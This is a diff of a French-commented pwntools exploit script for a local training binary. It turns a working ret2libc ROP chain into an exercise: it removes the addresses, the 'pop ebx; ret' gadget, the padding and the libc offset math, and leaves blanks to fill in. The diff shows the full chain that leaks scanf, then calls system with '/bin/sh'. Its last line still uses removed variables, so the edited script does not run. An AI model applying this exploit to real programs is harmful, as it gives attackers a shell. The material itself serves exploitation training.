@@ -24,28 +24,40 @@ def start():
     p = process('./rop')
     wait("Input:")
 
-
-# pwntools permet de récupérer les adresses directement dans le binaire sans avoir à les chercher via objdump :
-addrmain = b.symbols['main']
-pr = 0x08049233  #: pop ebx ; ret
-gotscanf = b.symbols['got.__isoc99_scanf']
-pltputs = b.symbols['puts']
-padding="A"*106
+# Modifier les address ici afin que vous ayez le leak des de l'addresse de scanf
+addrmain =  # main
+gadget =  # Gadget
+gotscanf = # scanf
+pltputs =  # puts@plt 
+padding= "A"*  # Padding
 
 start()
 log.info("Construct ropchain")
-ropchain=padding+p32(pltputs)+p32(pr)+p32(gotscanf)+p32(addrmain) # p32 permet de "pack" une adresse : 0x61616161 -> "aaaa"
+ropchain=padding+p32(pltputs)+p32(gadget)+p32(gotscanf)+p32(addrmain)
 log.info("Get scanf leak")
 p.sendline(ropchain)
 
 leak=wait('Input:')
 leak_scanf = u32(leak[2:6])
-leak_system = leak_scanf - libc.symbols['__isoc99_scanf'] + libc.symbols['system']
-leak_binsh = leak_scanf - libc.symbols['__isoc99_scanf'] + next(libc.search('/bin/sh\x00'))
+
+# Trouver les addresses dans la libc /lib32/libc.so.6
+libcScanf = # scanf()
+libcSystem = # system()
+libcBinSh = # /bin/sh
+
+# Base de l'addresses de la libc 
+offset = leak_scanf - 
+
+# Adresses de la fonction system
+system = offset + 
+
+# Adresse de la string "/bin/sh"
+binsh = offset + 
+
 
 log.info("Leak got scanf: "+str(hex(leak_scanf)))
-log.info("Leak system: "+str(hex(leak_system)))
-log.info("Leak /bin/sh: "+str(hex(leak_binsh)))
+log.info("Leak system: "+str(hex(system)))
+log.info("Leak /bin/sh: "+str(hex(binsh)))
 
 log.info("Get shell")
 ropchain=padding+p32(leak_system)+p32(pr)+p32(leak_binsh)
